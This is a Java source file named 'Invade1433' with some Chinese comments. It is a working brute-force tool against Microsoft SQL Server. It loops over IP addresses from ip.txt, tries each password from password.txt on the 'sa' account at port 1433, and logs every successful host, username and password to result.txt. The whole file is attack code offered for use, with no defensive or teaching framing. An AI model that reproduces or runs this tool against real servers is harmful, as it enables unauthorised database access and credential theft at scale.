import java.sql.*;
import java.util.ArrayList;
import java.io.*;

public class Invade1433 {
	static final String userPwd = "";
	private static final String userName = "sa";
	private static final String driverName = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
	private static File fIp = new File("ip.txt");
	private static File fResult = new File("result.txt");
	private static File fPwd = new File("password.txt");
	private static ArrayList<String> pwdList;

	public static void main(String[] args) {

		getInstance();

		ArrayList<String> ipList = getFileContent(fIp);
		pwdList = getFileContent(fPwd);
		// 连接数据库
		for (int i = 0; i < ipList.size(); i++) {
			String dbURL = "jdbc:sqlserver://" + ipList.get(i)
					+ ":1433; DatabaseName=master";
			jdbcConnection(dbURL);
		}
	}

	private static void jdbcConnection(String dbURL) {
		
		System.out.println(dbURL);
		
		//guess pwd
		for (String userPwd : pwdList) {
			System.out.println(userPwd);
			try {
				Connection dbConn = DriverManager.getConnection(dbURL, userName, userPwd);
				System.out.println("Connection OK!");
				writeResult(dbURL, userName, userPwd);
				System.out.println("WriteResult Successful");
				break;
			} catch (SQLException e) {
				System.out.println("Connection error, maybe password wrong or time out");
			}
		}
	}

	private static void writeResult(String dbURL, String userName,
			String userPwd) {
		Writer out;
		try {
			out = new FileWriter(fResult, true); // 第二个参数表明追加
			BufferedWriter bufw = new BufferedWriter(out);
			bufw.write(dbURL);
			bufw.newLine();
			bufw.write(userName);
			bufw.newLine();
			bufw.write(userPwd);
			bufw.newLine();
			bufw.close();
			out.close();
		} catch (IOException e) {

		}
	}

	private static ArrayList<String> getFileContent(File file) {
		ArrayList<String> temp = new ArrayList<String>();
		Reader in;
		String str = "";
		try {
			in = new FileReader(file);
			BufferedReader bufr = new BufferedReader(in);
			while ((str = bufr.readLine()) != null) {
				temp.add(str);
			}
			bufr.close();
			in.close();
		} catch (FileNotFoundException e) {
			System.out.println("FileNotFoundException");
		} catch (IOException e) {
			System.out.println("IOException");
		}
		return temp;
	}

	public static void getInstance() {
		try {
			Class.forName(driverName).newInstance();
			System.out.println("newInstance OK");
		} catch (Exception e1) {
			System.out.println("newInstance Error!");
			return;
		}
	}
}
